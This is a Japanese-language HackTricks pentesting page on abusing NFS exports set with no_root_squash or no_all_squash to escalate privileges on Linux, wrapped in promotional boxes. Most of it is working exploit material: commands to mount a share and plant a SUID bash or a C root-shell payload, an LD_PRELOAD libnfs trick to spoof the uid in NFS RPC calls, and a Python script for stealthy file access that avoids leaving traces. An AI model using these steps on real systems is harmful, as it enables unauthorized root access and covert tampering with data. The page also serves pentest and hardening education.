<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>


_ **/etc/exports** _ ファイルを読み、**no\_root\_squash**として設定されているディレクトリがあれば、クライアントとして**アクセス**し、そのディレクトリ内にローカルの**root**であるかのように**書き込む**ことができます。

**no\_root\_squash**: このオプションは、クライアントのrootユーザーにNFSサーバー上のファイルにrootとしてアクセスする権限を与えます。これにより、深刻なセキュリティ上の問題が発生する可能性があります。

**no\_all\_squash:** これは**no\_root\_squash**オプションに似ていますが、**非rootユーザー**に適用されます。例えば、nobodyユーザーとしてシェルを持っていて、/etc/exportsファイルをチェックし、no\_all\_squashオプションが存在する場合、/etc/passwdファイルをチェックし、非rootユーザーをエミュレートし、そのユーザーとしてsuidファイルを作成します（nfsを使用してマウントする）。nobodyユーザーとしてsuidを実行し、別のユーザーになります。

# 権限昇格

## リモートエクスプロイト

この脆弱性を見つけた場合、次のように利用できます:

* クライアントマシンでそのディレクトリを**マウント**し、マウントされたフォルダ内に**/bin/bash**バイナリをrootとして**コピー**し、**SUID**権限を与え、被害者のマシンからそのbashバイナリを**実行**します。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* クライアントマシンでそのディレクトリを**マウントし**、ルートとしてマウントされたフォルダ内にコンパイルされたペイロードを**コピーし**、それに**SUID**権限を与え、被害者のマシンからそのバイナリを**実行します**（こちらでいくつかの[C SUIDペイロード](payloads-to-execute.md#c)を見つけることができます）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## ローカルエクスプロイト

{% hint style="info" %}
自分のマシンから被害者のマシンへの**トンネルを作成できる場合は、必要なポートをトンネリングしてこの特権昇格をリモートバージョンで利用することができます**。\
次のトリックは、ファイル `/etc/exports` が**IPアドレスを指定している**場合に関するものです。この場合、**リモートエクスプロイトは**いかなる場合でも**使用できません**し、このトリックを**悪用する必要があります**。\
エクスプロイトが機能するためのもう一つの必要条件は、`/etc/export` 内の**エクスポートが `insecure` フラグを使用していることです**。\
\--_`/etc/export` がIPアドレスを指している場合、このトリックが機能するかどうかは確信がありません_--
{% endhint %}

## 基本情報

このシナリオでは、ローカルマシンにマウントされたNFS共有を悪用し、クライアントがそのuid/gidを指定できるNFSv3仕様の欠陥を利用して、許可されていないアクセスを可能にします。悪用には、NFS RPCコールの偽造を可能にする[libnfs](https://github.com/sahlberg/libnfs)というライブラリを使用します。

### ライブラリのコンパイル

ライブラリのコンパイル手順は、カーネルバージョンに基づいて調整が必要な場合があります。この特定のケースでは、fallocateシステムコールがコメントアウトされていました。コンパイルプロセスには以下のコマンドが含まれます：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### エクスプロイトの実施

このエクスプロイトは、root権限を昇格させるシンプルなCプログラム (`pwn.c`) を作成し、シェルを実行することを含みます。プログラムはコンパイルされ、結果のバイナリ (`a.out`) が suid rootで共有に配置されます。`ld_nfs.so` を使用して RPC コールで uid を偽装します：

1. **エクスプロイトコードをコンパイルする:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **共有にエクスプロイトを配置し、uidを偽装してその権限を変更する:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **root権限を得るためにエクスプロイトを実行する:**
```bash
/mnt/share/a.out
#root
```

## ボーナス: ステルスなファイルアクセスのための NFShell
rootアクセスを取得したら、所有権を変更せずに（痕跡を残さないように）NFS共有と対話するために、Pythonスクリプト (nfsh.py) を使用します。このスクリプトは、アクセスされるファイルのuidに合わせてuidを調整し、共有上のファイルと権限の問題なく対話することを可能にします：
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
実行方法:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# 参考文献
* https://www.errno.fr/nfs_privesc.html


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでAWSハッキングを学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
